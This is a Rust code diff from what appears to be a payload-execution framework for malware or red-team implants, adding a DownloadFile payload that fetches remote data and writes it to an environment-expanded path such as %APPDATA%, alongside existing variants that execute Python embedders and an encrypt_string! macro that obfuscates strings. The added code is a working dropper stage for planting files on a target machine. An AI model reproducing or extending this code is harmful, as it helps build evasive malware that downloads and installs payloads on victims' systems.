@@ -7,7 +7,6 @@ use std::mem;
 
 #[cfg(target_os = "linux")]
 use std::os::unix::fs::PermissionsExt;
-
 use serde::{Deserialize, Serialize};
 
 use rand::Rng;
@@ -42,6 +41,7 @@ pub enum Payload {
     ExecPython(ExecPython),
     Banner(),
     Empty(Empty),
+    DownloadFile(WriteFile),
 }
 impl Payload {
     pub fn exec_payload(&self) {
@@ -52,6 +52,7 @@ impl Payload {
             Payload::ExecPython(payload) => payload.deploy_embedder(),
             Payload::Banner() => Ok(banner()),
             Payload::Empty(payload) => Ok(payload.void()),
+            Payload::DownloadFile(payload) => payload.download_file(),
         };
         match exec_result {
             Ok(_) => {}
@@ -300,3 +301,56 @@ pub fn basename(out_filepath: &String) -> String {
     let filename = path.file_name().unwrap();
     filename.to_str().unwrap().to_string()
 }
+
+
+
+
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct WriteFile {
+    pub link: Link,
+    pub out_filepath: String,
+    //pub out_overwrite: bool,
+    //random name... mais il faut trouver un moyen pour passer la value aux payloads suivantes.
+}
+use std::fs::File;
+//use std::io::Write;
+use std::fs::create_dir_all;
+//use std::path::Path;
+use shellexpand;
+
+impl WriteFile {
+    pub fn download_file(&self) -> Result<(), anyhow::Error> {
+        let body: Vec<u8> = self.link.fetch_data()?;
+        //let data_write_path = self.write_file(body)?;
+        //TODO calculate the PATH, create
+        let path_with_env = &self.out_filepath;
+        let expanded = shellexpand::env(path_with_env)?; // Expands %APPDATA% or any other environment variable       
+        let path = Path::new(&*expanded); // Convert to a Path
+        println!("Expanded Path: {:?}", path);
+
+        match path.parent() {
+            Some(parent_dir) => {
+                if fs::metadata(parent_dir).is_ok() == false{
+                    info!("[+] path not exist, create: {:?}",parent_dir);
+                    create_dir_all(parent_dir)?;
+                }
+            },
+            None =>     error!(
+                "{}{:?}",
+                encrypt_string!("error, impossible to retreive parent path: "),
+                path
+            )
+        
+        };
+
+        let mut f = File::create(path)?;
+        info!("[+] Write file: {:?}",path);
+        f.write_all(&body)?;
+        Ok(())
+    }
+
+
+}
+
+
